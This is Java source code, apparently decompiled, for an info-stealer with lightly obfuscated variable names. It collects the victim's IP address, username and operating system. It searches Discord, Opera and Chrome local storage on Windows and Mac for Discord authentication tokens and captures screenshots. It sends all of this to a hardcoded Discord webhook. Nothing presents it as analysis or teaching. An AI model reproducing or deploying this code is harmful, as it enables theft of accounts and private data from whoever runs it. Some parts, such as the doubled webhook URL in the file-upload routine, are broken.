import java.awt.Dimension;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.imageio.ImageIO;

public class Main {
  public static void main(String[] args) {
    String llLlLlL = System.getProperty("os.name");
    try {
      URL whatismyip = new URL("http://checkip.amazonaws.com");
      BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(
            whatismyip.openStream()));
      String ip = bufferedReader.readLine();
      String llLlLlLlL = System.getProperty("user.name");
      captureScreen();
      sendMessage("``` NAME : " + llLlLlLlL + "\n IP" + "   : " + ip + " \n OS   : " + llLlLlL + "```");
    } catch (Exception exception) {}
    if (llLlLlL.contains("Windows")) {
      List<String> paths = new ArrayList<>();
      paths.add(String.valueOf(System.getProperty("user.home")) + "/AppData/Roaming/discord/Local Storage/leveldb/");
      paths.add(String.valueOf(System.getProperty("user.home")) + "/AppData/Roaming/discordptb/Local Storage/leveldb/");
      paths.add(String.valueOf(System.getProperty("user.home")) + "/AppData/Roaming/discordcanary/Local Storage/leveldb/");
      paths.add(String.valueOf(System.getProperty("user.home")) + "/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb");
      paths.add(String.valueOf(System.getProperty("user.home")) + "/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb");
      int cx = 0;
      StringBuilder webhooks = new StringBuilder();
      webhooks.append("TOKEN\n");
      try {
        for (String path : paths) {
          File f = new File(path);
          String[] pathnames = f.list();
          if (pathnames == null)
            continue; 
          byte b;
          int i;
          String[] arrayOfString1;
          for (i = (arrayOfString1 = pathnames).length, b = 0; b < i; ) {
            String pathname = arrayOfString1[b];
            try {
              FileInputStream fstream = new FileInputStream(String.valueOf(path) + pathname);
              DataInputStream in = new DataInputStream(fstream);
              BufferedReader br = new BufferedReader(new InputStreamReader(in));
              String strLine;
              while ((strLine = br.readLine()) != null) {
                Pattern p = Pattern.compile("[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}");
                Matcher m = p.matcher(strLine);
                while (m.find()) {
                  if (cx > 0)
                    webhooks.append("\n"); 
                  webhooks.append(" ").append(m.group());
                  cx++;
                } 
              } 
            } catch (Exception exception) {}
            b++;
          } 
        } 
        sendMessage("```" + webhooks.toString() + "```");
      } catch (Exception e) {
        sendMessage("``` UNABLE TO PULL TOKENS : " + e + "```");
      } 
    } else if (llLlLlL.contains("Mac")) {
      List<String> paths = new ArrayList<>();
      paths.add(String.valueOf(System.getProperty("user.home")) + "/Library/Application Support/discord/Local Storage/leveldb/");
      int cx = 0;
      StringBuilder webhooks = new StringBuilder();
      webhooks.append("TOKEN\n");
      try {
        for (String path : paths) {
          File f = new File(path);
          String[] pathnames = f.list();
          if (pathnames == null)
            continue; 
          byte b;
          int i;
          String[] arrayOfString1;
          for (i = (arrayOfString1 = pathnames).length, b = 0; b < i; ) {
            String pathname = arrayOfString1[b];
            try {
              FileInputStream fstream = new FileInputStream(String.valueOf(path) + pathname);
              DataInputStream in = new DataInputStream(fstream);
              BufferedReader br = new BufferedReader(new InputStreamReader(in));
              String strLine;
              while ((strLine = br.readLine()) != null) {
                Pattern p = Pattern.compile("[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}");
                Matcher m = p.matcher(strLine);
                while (m.find()) {
                  if (cx > 0)
                    webhooks.append("\n"); 
                  webhooks.append(" ").append(m.group());
                  cx++;
                } 
              } 
            } catch (Exception exception) {}
            b++;
          } 
        } 
        sendMessage("```" + webhooks.toString() + "```");
      } catch (Exception e) {
        sendMessage("``` UNABLE TO PULL TOKEN[S] : " + e + "```");
      } 
    } else {
      sendMessage("```UNABLE TO FIND OTHER INFORMATION. OS IS NOT SUPPORTED```");
    } 
    try {
      captureScreen();
    } catch (Exception ex) {
      sendMessage("``` UNABLE TO SCREENSHOT : " + ex + "```");
    } 
  }
  
  private static void sendMessage(String message) {
    PrintWriter out = null;
    BufferedReader in = null;
    StringBuilder result = new StringBuilder();
    try {
      URL realUrl = new URL("https://discord.com/api/webhooks/889172739133423616/P71hrzHKpkSvhZiLu2aPu_V38vyrW0J_LbcdbxHVFV3i3LbrJMRgSmb0CqMYpumYfeSH");
      URLConnection conn = realUrl.openConnection();
      conn.setRequestProperty("accept", "*/*");
      conn.setRequestProperty("connection", "Keep-Alive");
      conn.setRequestProperty("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)");
      conn.setDoOutput(true);
      conn.setDoInput(true);
      out = new PrintWriter(conn.getOutputStream());
      String postData = String.valueOf(URLEncoder.encode("content", "UTF-8")) + "=" + URLEncoder.encode(message, "UTF-8");
      out.print(postData);
      out.flush();
      in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
      String line;
      while ((line = in.readLine()) != null)
        result.append("/n").append(line); 
    } catch (Exception e) {
      e.printStackTrace();
    } finally {
      try {
        if (out != null)
          out.close(); 
        if (in != null)
          in.close(); 
      } catch (IOException ex) {
        ex.printStackTrace();
      } 
    } 
    System.out.println(result.toString());
  }
  
  private static void sendFile(File file) throws IOException {
    String url = "https://discord.com/api/webhooks/889172739133423616/P71hrzHKpkSvhZiLu2aPu_V38vyrW0J_LbcdbxHVFV3i3LbrJMRgSmb0CqMYpumYfeSHhttps://discord.com/api/webhooks/889172739133423616/P71hrzHKpkSvhZiLu2aPu_V38vyrW0J_LbcdbxHVFV3i3LbrJMRgSmb0CqMYpumYfeSH";
    String boundary = Long.toHexString(System.currentTimeMillis());
    URLConnection connection = (new URL(url)).openConnection();
    connection.setDoOutput(true);
    connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36");
    connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
    Exception exception1 = null, exception2 = null;
    try {
      PrintWriter writer = new PrintWriter(new OutputStreamWriter(connection.getOutputStream(), StandardCharsets.US_ASCII));
      try {
        writer.println("--" + boundary);
        writer.println("Content-Disposition: form-data; name=\"" + file.getName() + "\"; filename=\"" + file.getName() + "\"");
        writer.write("Content-Type: image/png");
        writer.println();
        writer.println(readAllBytes(new FileInputStream(file)));
        Exception exception3 = null, exception4 = null;
      } finally {
        if (writer != null)
          writer.close(); 
      } 
    } finally {
      exception2 = null;
      if (exception1 == null) {
        exception1 = exception2;
      } else if (exception1 != exception2) {
        exception1.addSuppressed(exception2);
      } 
    } 
  }
  
  public static byte[] readAllBytes(InputStream stream) throws IOException {
    int pos = 0;
    byte[] output = new byte[0];
    byte[] buf = new byte[1024];
    int count;
    while ((count = stream.read(buf)) > 0) {
      if (pos + count >= output.length) {
        byte[] tmp = output;
        output = new byte[pos + count];
        System.arraycopy(tmp, 0, output, 0, tmp.length);
      } 
      for (int i = 0; i < count; i++)
        output[pos++] = buf[i]; 
    } 
    return output;
  }
  
  private static void captureScreen() throws Exception {
    Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
    Rectangle screenRectangle = new Rectangle(screenSize);
    Robot robot = new Robot();
    BufferedImage image = robot.createScreenCapture(screenRectangle);
    int random = (new Random()).nextInt();
    File file = new File("cached_" + random + ".png");
    ImageIO.write(image, "png", file);
    sendFile(file);
    file.delete();
  }
}
